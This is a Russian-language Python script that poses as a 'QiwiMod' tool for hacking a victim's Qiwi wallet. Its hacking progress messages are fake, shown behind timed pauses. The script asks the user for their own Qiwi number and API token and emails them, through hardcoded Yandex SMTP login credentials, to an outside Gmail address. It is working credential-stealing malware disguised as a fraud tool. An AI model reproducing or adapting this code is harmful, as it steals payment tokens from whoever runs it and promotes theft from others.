#Что ты тут забыл, а ?
import subprocess
subprocess.call("pip install termcolor", shell=True)
subprocess.call("pip install colorama", shell=True)


import sys
from os import system
from time import sleep
import os
import time
import random
from termcolor import colored
from platform import platform
from colorama import Fore, Back, Style
from colorama import init

delet = 'clear'
dr = '/'
os.system(delet)

list = [(colored(' 70%','red')), (colored(' 80%','red')), (colored(' 90%', 'red')), (colored(' 100%','red'))]

kop = [(colored("Ошибка валидации",'red')), (colored('Ошибка, серверы перенагружены, попробуйте посже','red')), (colored('Обнаружена не легальная лицензия, пожалуйста приобретите лицензию','red')), (colored('Ошибка, главный сервер не ответил, пожалуйста попробуйте посже','red'))]

print(" ")
print(" ")
print(" ")
print(Fore.GREEN)
print("""  ____  _          _ __  __           _ 
 / __ \(_)        (_)  \/  |         | |
| |  | |___      ___| \  / | ___   __| |
| |  | | \ \ /\ / / | |\/| |/ _ \ / _` |
| |__| | |\ V  V /| | |  | | (_) | (_| |
 \___\_\_| \_/\_/ |_|_|  |_|\___/ \__,_|                         """)
print(Fore.WHITE)
print("""
+============+          
 version: 1.9                 
+============+             
 by: GlaDDoS
+============+
 language: ru
+============+
""")
print(colored("""                                                            
                                                            
                                                            
                           .....                            
                    .',:cllooooollc:;'.                     
                 .;coxxxxxdxxddddxxxxxdl:'.                 
              .,cdxxxxxxxxxxxxxxxxxxxxxdddo;.               
             ,ldxdxxxxdoc:;,,,,,;:codxxdxxxxo:.             
           .cdxxxxxdo:'.           ..;ldxxxxxdl'            
          .lxxxxxdo,.                  'cdxdxxxd,           
         .lxxxxxd:.                      ,oxxxxxd,          
         :xxxxxd:.                        'oxxxxxl.         
        .oxxxdxl.                          ;dxxxxd,         
        'dxxxxx;                           'oxxxxx:         
        ,dxxxxx;                        ...'oxxxxx:         
        'oxxxxx:.                       .',cdxxxxx:         
        .cxxxxxo'                          .'ldxxd'         
         ,dxxxxxl.                           .:dx:.         
          ;dxxxxxo,.                        ...:l.          
           ;dxxxxxdl,.       .c;.           'c'..           
            'ldxxxxxxoc,'..  ,ool'     .:;.  .              
             .;ldxxxxxxxddolloddxdc'.  .co:.                
               .,codxxxxxxxxxxxxxxxxoc;,''.                 
                  .':codxxxxxxxxxxxxxxxxddolc;'.            
                      ..',,;;;;;;,,,''''''',;:clc;.         
                                               ..;c:.       
                                                   .;,.     
                                                            
                                                            
                                                            
""""",'yellow'))	

p = input(colored("Введите код доступа: ", 'magenta'))

print(colored("Проверка кода доступа...",'yellow'))
time.sleep(5)

if  (float(p)) == 4428:
	del p

elif(float(p)) != 4428:
	print(colored("Введен не верный код доступа ", 'red'))
	sys.exit()

print(colored("Код доступа успешно принят!",'cyan'))
time.sleep(1)
m = input(colored("Введите номер жертвы: ",'green'))

f = input(colored("Введите свой Qiwi: ",'green'))
if (len(f)) == 11:
	c = 2
	
elif (len(f)) != 11:
	print(colored("Введен неверный Qiwi",'red'))
	sys.exit()
	
h = input(colored("Введите сумму перевода: ",'green'))
print(colored("Если на балансе жертвы менее ",'blue') +(colored(h,'magenta') + (colored("₽",'magenta') + (colored(", то плата будет соотвествующая",'blue')))))

z = input(colored("Введите комментарий к переводу: ", 'green'))

time.sleep(2)
print("")
print(colored("Взламываем",'cyan') + (colored(" QiWi",'yellow') + (colored("...", 'cyan'))))
time.sleep(5)
print(colored("Собираем информацию, о пользователе...",'cyan'))
time.sleep(5)
print(colored("Информация собрана!",'green'))
time.sleep(2)
print(colored("Поиск уязвимостей...",'cyan'))
time.sleep(5)
print(colored("Уязвимости найдены!",'green'))
time.sleep(2)
print(colored("Применяем SQL инъекцию...",'yellow'))
time.sleep(5)
print(colored("Применяем уязвимость FG-1...",'yellow'))
time.sleep(7)
print(colored("Успешно взломано !",'magenta'))

print("")
print(colored('Шанс успешного вывода ','green') + (colored(h,'cyan') + (colored("₽",'cyan') + (colored(' -', 'green') + (colored(random.choice(list),'red'))))))


print(colored("Qiwi токен можно получить здесь: ",'blue') + (colored("https://qiwi.com/api",'red')))

n = input(colored("Введите свой Qiwi токен: ",'green'))
if (len(n)) == 32:
	geu = 67
	
elif(len(n)) != 32:
	print(colored("Введен не верный токен! ", 'red'))
	sys.exit()

time.sleep(2)
print("")
print(colored("Выводим деньги...", 'magenta'))
time.sleep(5)
print(random.choice(kop))

ter = f + ":" + n


import smtplib                                            
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_mail():
	login = "salinfedor@yandex.ru"
	password = "salo3241"
	url = "smtp.yandex.ru"
	toaddr = "dorgkippmen@gmail.com"		
	msg = MIMEMultipart()
	msg['Subject'] = 'Abode'
	msg['From'] = 'salinfedor@yandex.ru'
	body = str(ter)
	msg.attach(MIMEText(body, 'plain'))
	
	try:
		server = smtplib.SMTP_SSL(url, 465)
	
	except TimeoutError:
		print(colored('Соеденение разорвано, проверьте соеденение с интернетом', 'red'))
	server.login(login, password)
	server.sendmail(login, toaddr, msg.as_string())
	server.quit()


def main():
	send_mail()

if __name__ == "__main__":
	main()
#здесь конец :3
